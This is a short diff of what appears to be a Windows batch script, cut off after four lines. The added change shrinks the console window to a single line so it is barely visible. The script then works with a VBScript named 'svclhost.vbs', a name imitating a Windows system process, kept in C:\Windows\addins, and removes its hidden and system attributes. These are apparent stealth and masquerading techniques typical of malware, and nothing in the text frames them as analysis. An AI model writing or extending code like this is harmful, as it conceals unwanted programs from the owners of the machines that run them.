@@ -1,4 +1,4 @@
-@echo off
+@echo off & mode 16,1
 cd "C:\Windows\addins"
 if exist "C:\Windows\addins\svclhost.vbs" (
 	attrib -h -s "C:\Windows\addins\svclhost.vbs"
